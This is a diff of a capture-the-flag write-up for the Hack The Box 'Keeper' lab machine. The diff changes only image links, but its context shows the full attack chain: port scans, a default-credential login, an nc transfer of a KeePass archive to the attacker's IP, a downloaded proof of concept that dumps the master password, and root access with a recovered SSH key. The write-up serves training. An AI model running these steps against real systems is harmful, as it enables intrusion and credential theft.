@@ -38,7 +38,7 @@ First, we verify that the host is reachable:
 ping -c 1 10.10.11.227
 ```
 
-![[GitHub Documentation/EASY/HTB_Keeper_Writeup/screenshots/ping.png]]
+![](screenshots/ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -49,7 +49,7 @@ We scan all TCP ports with Nmap to identify services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.227 -oG allPorts
 ```
 
-![[GitHub Documentation/EASY/HTB_Keeper_Writeup/screenshots/allports.png]]
+![](screenshots/allports.png)
 
 Extract open ports:
 
@@ -57,7 +57,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![[GitHub Documentation/EASY/HTB_Keeper_Writeup/screenshots/extractports.png]]
+![](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -68,16 +68,16 @@ We run a detailed scan on discovered ports:
 nmap -sCV -p22,80 10.10.11.227 -oN targeted
 ```
 
-![[GitHub Documentation/EASY/HTB_Keeper_Writeup/screenshots/targeted.png]]
+![](screenshots/targeted.png)
 
 **Findings:**  
 - **SSH** → OpenSSH 8.9p1 Ubuntu 3ubuntu0.3  
 
-![[launchpad_openssh.png]]
+![](launchpad_openssh.png)
 
 - **HTTP** → nginx 1.18.0
 
-![[launchpad_nginx.png]]
+![](screenshots/launchpad_nginx.png)
 
 Note: The `Uploaded To` field in banners hints that one service could be containerized (possibly Docker), but this detail does not directly affect exploitation.
 
@@ -88,11 +88,11 @@ Note: The `Uploaded To` field in banners hints that one service could be contain
 
 Visiting the IP shows a placeholder page:  
 
-![[GitHub Documentation/EASY/HTB_Keeper_Writeup/screenshots/web.png]]
+![](screenshots/web.png)
 
 Clicking the message displays an error implying the hostname must be in `/etc/hosts`:  
 
-![[web_not_in_etc_hosts.png]]
+![](screenshots/web_not_in_etc_hosts.png)
 
 We add:
 
@@ -102,14 +102,14 @@ We add:
 
 Now, the site loads a login page:  
 
-![[web_in_etc_hosts.png]]
+![](screenshots/web_in_etc_hosts.png)
 
 ---
 ### 2.2 Identifying Request Tracker
 
 We see “Request Tracker” branding:  
 
-![[request_tracker.png]]
+![](screenshots/request_tracker.png)
 
 Searching for it on Google reveals the GitHub repository:  
 [https://github.com/bestpractical/rt](https://github.com/bestpractical/rt)
@@ -131,7 +131,7 @@ Username: root
 Password: password
 ```
 
-![[web_login.png]]
+![](screenshots/web_login.png)
 
 Access granted.
 
@@ -140,9 +140,9 @@ Access granted.
 
 Inside `Admin → Users`, we locate another user:  
 
-![[web_admin_users_section.png]]  
+![](screenshots/web_admin_users_section.png)
 
-![[web_lnorgaard.png]]  
+![](screenshots/web_lnorgaard.png)
 
 Credentials found:
 
@@ -162,7 +162,7 @@ We connect via SSH:
 ssh lnorgaard@10.10.11.227
 ```
 
-![[ssh_lnorgaard.png]]
+![](screenshots/ssh_lnorgaard.png)
 
 🏁 **User flag obtained**.
 
@@ -179,7 +179,7 @@ lsb_release -a
 ls -l
 ```
 
-![[ssh_lnorgaard_info.png]]
+![](screenshots/ssh_lnorgaard_info.png)
 
 This is an Ubuntu Jammy system.
 
@@ -198,7 +198,7 @@ nc -nlvp 443 > file.zip
 nc 10.10.14.7 443 < RT30000.zip
 ```
 
-![[download_zip_file.png]]
+![](screenshots/download_zip_file.png)
 
 Verify integrity:
 
@@ -206,26 +206,26 @@ Verify integrity:
 md5sum file.zip
 ```
 
-![[zip_file_hash.png]]
+![](screenshots/zip_file_hash.png)
 
 ---
 ### 4.3 KeePass Database Analysis
 
 Unzipping reveals `passcodes.kdbx`:  
 
-![[read_files_in_zip_file.png]]  
-![[unzip_zip_file.png]]
+![](screenshots/read_files_in_zip_file.png)
+![](screenshots/unzip_zip_file.png)
 
 Opening with KeePassXC requires a master password:  
 ```bash
 keepassxc passcodes.kdbx
 ```
 
-![[keepass_app.png]]
+![](screenshots/keepass_app.png)
 
 We dump its hash:  
 
-![[keepass2john_kdbx.png]]
+![](screenshots/keepass2john_kdbx.png)
 
 The hash is not crackable with standard wordlists.
 
@@ -242,11 +242,11 @@ wget https://raw.githubusercontent.com/matro7sh/keepass-dump-masterkey/refs/head
 python3 poc.py KeePassDumpFull.dmp
 ```
 
-![[wget_poc_py.png]]
+![](screenshots/wget_poc_py.png)
 
 Output contains special characters. Searching reveals it’s Danish: `Rødgrød med Fløde`.
 
-![[password_search.png]]
+![](screenshots/password_search.png)
 
 ---
 ### 4.5 Unlocking KeePass
@@ -258,7 +258,7 @@ rødgrød med fløde
 
 Inside KeePass, we find two entries. The `root` entry contains a **PuTTY-User-Key-File**:  
 
-![[keepass_password_saved.png]]
+![](screenshots/keepass_password_saved.png)
 
 ---
 ## 5. Privilege Escalation
@@ -268,10 +268,10 @@ Inside KeePass, we find two entries. The `root` entry contains a **PuTTY-User-Ke
 First, we verify that common direct escalation paths are **not** viable:
 
 - SSH login as `root` using a password → rejected.  
-    ![[ssh_root.png]]
+    ![](screenshots/ssh_root.png)
 
 - From the compromised user, trying to elevate locally (e.g., `sudo`/`su`) also fails.  
-    ![[lnorgaard_ssh.png]]
+    ![](screenshots/lnorgaard_ssh.png)
 
 This confirms we must leverage the material found in KeePass.
 
@@ -285,9 +285,9 @@ The `root` entry in KeePass includes a **PuTTY-User-Key-File**. We save its cont
 puttygen private_key -O private-openssh -o id_rsa 
 ```
 
-![[private_key.png]]
+![](screenshots/private_key.png)
 
-![[id_rsa.png]]
+![](screenshots/id_rsa.png)
 
 ---
 
@@ -300,7 +300,7 @@ chmod 600 id_rsa
 ssh -i id_rsa root@10.10.11.227
 ```
 
-![[GitHub Documentation/EASY/HTB_Keeper_Writeup/screenshots/root_flag.png]]
+![](screenshots/root_flag.png)
 
 🏁 **Root flag obtained**.
 ---
